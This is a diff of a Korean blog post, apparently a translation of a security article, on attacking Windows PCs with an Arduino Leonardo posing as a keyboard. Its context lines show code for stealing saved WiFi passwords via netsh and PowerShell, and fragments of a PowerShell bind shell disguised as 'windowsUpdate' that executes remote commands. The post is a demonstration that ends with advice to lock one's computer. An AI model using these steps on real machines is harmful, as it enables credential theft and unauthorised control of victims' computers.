@@ -3,17 +3,13 @@ title: "아두이노로 컴퓨터 해킹하는 방법"
 description: ""
 coverImage: "/assets/img/2024-06-22-HackingacomputerusingArduino_0.png"
 date: 2024-06-22 18:52
-ogImage: 
+ogImage:
   url: /assets/img/2024-06-22-HackingacomputerusingArduino_0.png
 tag: Tech
 originalTitle: "Hacking a computer using Arduino"
 link: "https://medium.com/csg-govtech/hacking-a-computer-using-arduino-8f0ddddab7e1"
 isUpdated: true
 ---
-
-
-
-
 
 상상해보세요...
 
@@ -23,7 +19,18 @@ isUpdated: true
 
 아두이노는 C 프로그래밍 언어를 사용하여 하드웨어 장치를 제어할 수 있게 해주는 마이크로 컨트롤러 및 마이크로 컨트롤러 키트입니다. 아두이노에는 각각 고유한 특성을 가진 여러 종류가 있습니다. 예를 들어, 아두이노 우노는 가격이 저렵하고 기본 기능 세트를 갖춰 가장 인기 있는 아두이노 보드로 간주됩니다.
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 이 글은 ATmega32u4를 기반으로 한 마이크로 컨트롤러 보드인 Arduino Leonardo에 초점을 맞추고 있습니다. 내장 USB 통신을 갖추고 있어 컴퓨터에 연결된 키보드 또는 마우스처럼 위장할 수 있습니다. 다른 Arduino 제품인 Nano와 Uno도 사용해 봤지만, 컴퓨터를 속일 수 없었어요.
 
@@ -33,7 +40,18 @@ isUpdated: true
 
 먼저, Arduino Leonardo의 하드웨어 구성 요소를 소개하고 마이크로 컨트롤러 및 마이크로 컨트롤러 키트에서 기본 Arduino 제어기능을 시연해 보겠습니다.
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 아두이노 보드는 모두 setup 함수와 loop 함수로 구성되어 있어요.
 
@@ -43,7 +61,18 @@ isUpdated: true
 
 ## Loop 함수
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 이 기능은 설정 함수를 실행하면 계속 실행됩니다.
 
@@ -53,7 +82,18 @@ isUpdated: true
 
 # 공격 1: WiFi 비밀번호 도용
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 컴퓨터가 WiFi에 연결될 때마다 WiFi 비밀번호가 시스템에 저장됩니다. 이 좋은 소식은 PowerShell 명령을 활용하여 WiFi 서비스 세트 식별자(SSID)와 비밀번호 목록을 얻을 수 있다는 것입니다.
 
@@ -64,7 +104,7 @@ char stringArray[500] = {""};
 boolean extracted = false, dispatched = false;
 int extractButton = 2, dispatchButton = 3;
 
-void setup() {    
+void setup() {
     Serial.begin(9600);
     pinMode(extractButton, INPUT);
     pinMode(dispatchButton, INPUT);
@@ -78,7 +118,7 @@ void loop() {
     if(digitalRead(dispatchButton) == HIGH && !dispatched) {
         dispatchingData();
         dispatched = true;
-    }    
+    }
     if(digitalRead(extractButton) == LOW)
         extracted = false;
     if(digitalRead(dispatchButton) == LOW)
@@ -143,7 +183,18 @@ void dispatchingData() {
 - 프로그램은 WiFi의 SSID와 비밀번호를 추출하여 Arduino의 전기적으로 지워지지 않는 프로그램 가능 읽기 전용 메모리(EEPROM)에 저장합니다. 비휘발성 플래시 메모리 장치이므로 저장된 정보는 더 이상 전원이 공급되지 않아도 유지됩니다.
 - Arduino가 기능을 실행한 후에는 피해자 컴퓨터에서 이를 분리하고 제 컴퓨터에 연결합니다. 이번에는 EEPROM에 저장된 데이터를 Arduino가 내 컴퓨터로 덤프하는 오른쪽 버튼을 누릅니다.
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 # WiFi SSID 표시 명령어
 
@@ -162,7 +213,18 @@ Out-String -OutVariable dataCaptured
 
 WiFi SSID 표시 명령어가 길고 이해하기 어렵습니다. 이 글의 다음 부분에서는 명령어를 몇 가지 소화 가능한 섹션으로 나눠 코드의 기능을 이해하기 쉽게 설명하겠습니다.
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 # 명령어 이해하기
 
@@ -174,7 +236,18 @@ WiFi SSID 표시 명령어가 길고 이해하기 어렵습니다. 이 글의 �
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim();
 ```
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 <img src="/assets/img/2024-06-22-HackingacomputerusingArduino_3.png" />
 
@@ -186,7 +259,18 @@ WiFi SSID 표시 명령어가 길고 이해하기 어렵습니다. 이 글의 �
 
 이전 파이프에서 검색한 $name 변수를 사용했음을 주의하세요. netsh wlan 함수를 다시 호출하여 SSID에 대한 추가 정보를 얻습니다.
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 <img src="/assets/img/2024-06-22-HackingacomputerusingArduino_4.png" />
 
@@ -198,7 +282,18 @@ WiFi SSID 표시 명령어가 길고 이해하기 어렵습니다. 이 글의 �
 Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_}
 ```
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 ## 섹션 D
 
@@ -210,7 +305,18 @@ Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(
 
 # EEPROM에 데이터 저장하는 명령
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 아두이노에 데이터를 기록하려면 컴퓨터와 아두이노는 직렬 통신을 사용하여 상호 작용해야 합니다. 직렬 통신은 통신 채널 또는 USB를 통해 한 번에 한 비트씩 데이터를 전송하는 프로세스입니다. 각 포트는 COM1, COM2, COM3, COM4 등으로 식별됩니다. 각 COM은 입출력(I/O) 및 인터럽트 요청(IRQ) 주소를 나타냅니다. I/O 주소는 마우스나 키보드와 같은 주변 장치와 데이터를 전송하고 수신합니다. 직렬 통신의 속도 또는 '보드 속도'는 초당 비트로 측정됩니다. 이 데모에서는 9600비트 초당을 사용했습니다.
 
@@ -229,7 +335,18 @@ $serialObject.Write("$dataCaptured");
 
 ![이미지](/assets/img/2024-06-22-HackingacomputerusingArduino_5.png)
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 # 공격 2: 쉘 열기
 
@@ -335,7 +452,18 @@ void ipaddr() {
 
 위의 코드는 복잡해 보일 수 있으니, 단계별로 살펴보도록 하죠:
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 - 아두이노를 피해자 컴퓨터에 연결한 후 왼쪽 버튼을 누르면, 프로그램이 명령 프롬프트를 실행하고, 거기에 PowerShell 쉘 코드를 저장하는 updateSource라는 명령 프롬프트 변수를 생성합니다.
 - 그 후에 프로그램은 updateSource의 값이 기록된 PowerShell 스크립트 update.ps1을 생성합니다.
@@ -358,7 +486,7 @@ function windowsUpdate {
   while (($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0) {
     $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding;
     $data = $EncodedText.GetString($bytes,0,$i);
-    
+
     try {
       # 공격자로부터 명령 수신
       $sendback=(IEX -Command $data 2 >&1 | Out-String );
@@ -393,7 +521,18 @@ windowsUpdate;
 
 요약하면, 이 프로그램은 접속한 사람이 사용할 수 있는 포트 5566에서 bind shell을 구축하는 기능을 만들었습니다. 프로그램은 들어오는 연결을 기다리면서 update.ps1 파일을 삭제합니다. 이 시점에서 저는 bind shell 함수에 연결하여 피해자의 컴퓨터를 제어하기 시작합니다. PowerShell 스크립팅이 이렇게 간단한 것이죠?
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 # 데모 타임
 
@@ -402,7 +541,18 @@ windowsUpdate;
 - 피해자에게 셸 코드 삽입하고 IP 주소 추출하기
 - IP 주소 송부 및 피해자 컴퓨터 제어하기
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 우리의 알지 못하는 희생자들에게 소식을 전하는 여러 가지 방법이 있습니다. 여러분이 할 수 있는 일들에 대한 치트 시트입니다:
 
@@ -438,7 +588,18 @@ chrome.exe https://www.google.com/
 
 해킹 프로세스가 백그라운드에서 실행되기 때문에 희생자들은 자신의 컴퓨터가 해킹당했는지 감지할 수 없을 것입니다. 컴퓨터가 해킹당하는 잠재적 위험을 줄이기 위해 — 내 친애하는 동료들도 포함하여 — 책상을 비울 때 컴퓨터를 잠그는 것을 항상 기억해 주세요.
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 안녕하세요! 사이버 보안은 여러분부터 시작됩니다!
 
